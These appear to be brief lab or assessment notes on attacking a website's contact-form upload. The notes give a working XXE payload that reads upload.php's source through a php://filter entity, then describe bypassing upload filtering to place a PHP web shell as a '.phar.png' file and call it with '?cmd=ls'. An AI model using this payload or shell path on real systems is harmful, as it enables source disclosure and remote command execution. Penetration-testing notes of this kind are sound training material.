Popping `Burp` and going to the website. Looking into the Contact us page, there is an upload, seeing if we can capture traffic.

Getting a post request and modifying it with a XXE payload.
![[XXE-Assessment.png]]
Then using
```bash
<?xml version="1.0" encoding="UTF-8"?> <!DOCTYPE svg [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=upload.php"> ]> <svg>&xxe;</svg>
```
![[XXE-Assessment-2.png]]
Then decoding the base64.
Then target_dir being `./user_feedback_submissions/`
![[File-Upload-Result.png]]

Now bypassing the filtering to access the possible shells. Adding the reverse shell.
![[Webshell-Signiture.png]]
Then going to `IP/contact/user_feedback_submission/260903_shell.phar.png?cmd=ls`